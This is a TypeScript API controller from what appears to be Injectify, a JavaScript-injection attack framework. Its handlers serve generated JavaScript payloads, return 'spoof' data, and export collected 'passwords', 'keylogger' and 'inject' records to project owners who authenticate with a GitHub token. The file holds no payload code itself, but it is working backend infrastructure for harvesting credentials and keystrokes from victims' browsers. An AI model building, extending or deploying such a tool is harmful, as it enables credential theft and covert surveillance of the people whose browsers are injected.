import chalk from 'chalk'
import Spoof from './Spoof'
import Payload from './Payload'
import JSON from './JSON'

import GithubUser from '../database/GithubUser'
import UserPermissions from '../database/UserPermissions'

export default class {
  db: any

  constructor(mongodb: any) {
    this.db = mongodb
  }

  spoof(req: any, res: any) {
    let token: string = req.query.token
    let index: number = parseInt(req.query.index)
    let project: string = decodeURIComponent(req.path.substring(11))
    /**
     * Validate the token exists, the index is a number and the project param exists
     */
    if (token && !Number.isNaN(index) && project) {
      GithubUser(token).then(user => {
        let permissions = new UserPermissions(this.db)
        permissions.query(project, user).then(({ doc }) => {
          let api = new Spoof(this.db)
          api.query(doc, index).then(data => {
            res.json(data)
          }).catch(error => {
            res.json(error)
          })
        }).catch(error => {
          res.status(403).json(error)
        })
      }).catch(error => {
        res.status(401).json(error)
      })
    } else {
      res.status(400).json({
        title: 'Bad request',
        message: 'Make sure you specify a project, index and token in the request',
        format: `/api/spoof/${project || '$project'}?index=${index || '$index'}&token=${token || '$token'}`
      })
    }
  }

  payload(req: any, res: any) {
    res.setHeader('Content-Type', 'application/javascript')

    Payload(req.query).then(js => {
      res.send(js)
    }).catch(error => {
      res.status(400).send(error)
    })
  }

  json(req: any, res: any) {
    let token: string = req.query.token
    let page: string = req.path.split('/')[2]
    let project: string = decodeURIComponent(req.path.split('/')[3])
    if (token && project && (page === 'passwords' || page === 'keylogger' || page === 'inject')) {
      GithubUser(token).then(user => {
        let permissions = new UserPermissions(this.db)
        permissions.query(project, user).then(({ doc }) => {
          let api = new JSON(this.db)
          api.query(doc, page).then((json: any) => {
            res.setHeader('Content-Disposition', 'filename="Injectify_API_' + doc.name + '.json"')
            if (typeof req.query.download === 'string') {
              res.setHeader('Content-Type', 'application/octet-stream')
            } else {
              res.setHeader('Content-Type', 'application/json')
            }
            res.send(json)
            console.log(
              chalk.greenBright('[API/JSON] ') +
              chalk.yellowBright('delivered ') +
              chalk.magentaBright(page) +
              chalk.yellowBright(' for project ') +
              chalk.magentaBright(project) +
              chalk.redBright(` (length=${json ? json.length : 0}) `) +
              chalk.yellowBright('to ') +
              chalk.magentaBright(user.login) +
              chalk.redBright(' (' + user.id + ') ')
            )
          }).catch(error => {
            res.status(500).json(error)
          })
        }).catch(error => {
          res.status(403).json(error)
        })
      }).catch(error => {
        res.status(401).json(error)
      })
    } else {
      res.status(400).json({
        title: 'Bad request',
        message: 'Make sure you specify a project, page and token in the request',
        format: `/api/${page || '$page'}/${project || '$project'}?token=${token || '$token'}`
      })
    }
  }
}